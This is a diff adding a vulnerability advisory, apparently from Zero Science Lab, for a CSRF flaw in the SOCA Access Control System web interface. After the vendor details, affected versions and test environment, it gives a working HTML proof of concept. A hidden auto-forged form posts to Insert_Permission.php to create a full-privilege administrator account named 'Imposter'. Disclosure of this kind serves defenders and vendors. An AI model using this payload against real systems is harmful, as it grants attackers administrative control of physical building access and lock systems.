@@ -1,0 +1,46 @@
+SOCA Access Control System 180612 CSRF Add Admin Exploit
+
+
+Vendor: SOCA Technology Co., Ltd
+Product web page: http://www.socatech.com
+Affected version: 180612, 170000 and 141007
+
+Summary: The company's products include Proximity and Fingerprint access
+control system, Time and Attendance, Electric Locks, Card reader and writer,
+keyless entry system and other 30 specialized products. All products are
+attractively designed with advanced technology in accordance with users'
+safety and convenience which also fitted international standard.
+
+Desc: The application interface allows users to perform certain actions via
+HTTP requests without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+Tested on: Windows NT 6.1 build 7601 (Windows 7 Service Pack 1) i586
+           Windows NT 6.2 build 9200 (Windows Server 2012 Standard Edition) i586
+           Apache/2.2.22 (Win32)
+           PHP/5.4.13
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5520
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5520.php
+
+
+20.04.2018
+
+--
+
+
+<html>
+  <body>
+  <script>history.pushState('', 'shpa', '/index-pc.php')</script>
+    <form action="http://10.0.0.3/Permission/Insert_Permission.php" method="POST">
+      <input type="hidden" name="Permission" value='{"Idx":null,"Id":"Imposter","Password":"123456","Access":"ffffff00ff00ffffff00"}' />
+      <input type="submit" value="Forge!" />
+    </form>
+  </body>
+</html>
